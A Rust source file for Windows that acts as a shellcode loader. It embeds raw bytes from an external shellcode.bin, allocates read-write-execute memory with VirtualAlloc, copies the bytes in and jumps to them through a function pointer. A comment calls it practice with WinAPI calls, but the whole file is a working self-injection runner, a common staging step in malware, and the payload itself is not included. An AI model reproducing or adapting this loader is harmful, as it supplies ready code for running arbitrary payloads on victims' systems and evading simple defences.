use std::io::{Write, /*stdin*/};
use std::slice::from_raw_parts_mut;

extern "system"
{
    fn VirtualAlloc(lpAddress: usize,
                    dwSize: usize,
                    flAllocationType: u32,
                    flProtect: u32) -> usize;
}

const MEM_COMMIT:               u32     = 0x00001000;
const PAGE_EXECUTE_READWRITE:   u32     = 0x40;

const SHELLCODE_BYTES: &[u8] = include_bytes!("..\\shellcode.bin");
const SHELLCODE_LEN: usize   = SHELLCODE_BYTES.len();

#[no_mangle]
#[link_section = ".text"]
static SHELLCODE: [u8; SHELLCODE_LEN] = *include_bytes!("..\\shellcode.bin");

fn main()
{
    unsafe
    {
        self_inject();
    }
}

unsafe fn self_inject()
{
    // We could also just jump to the included shellcode
    // But this is just a pretext to use some WinAPI stuff

    let mem_addr = VirtualAlloc(0, 512usize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    println!("Memory Allocated at: {:#x}", mem_addr);

    let dst_buf = from_raw_parts_mut(mem_addr as *mut u8, SHELLCODE_LEN);
    byte_copy(SHELLCODE_BYTES, dst_buf);

    // Build a func ptr to a mem addr
    // Then deref and call
    let f = &(mem_addr as usize) as *const usize as *const fn();
    (*f)();

    //stall("--- Hit any key to terminate ---");
}

#[no_mangle]
fn byte_copy(from: &[u8], mut to: &mut [u8]) -> usize
{
    to.write(from).unwrap()
}

/*
fn stall(msg: &str)
{
    println!("{}", msg);
    let mut input_string = String::new();
    stdin().read_line(&mut input_string)
           .ok()
           .expect("Failed to read line");
}
*/
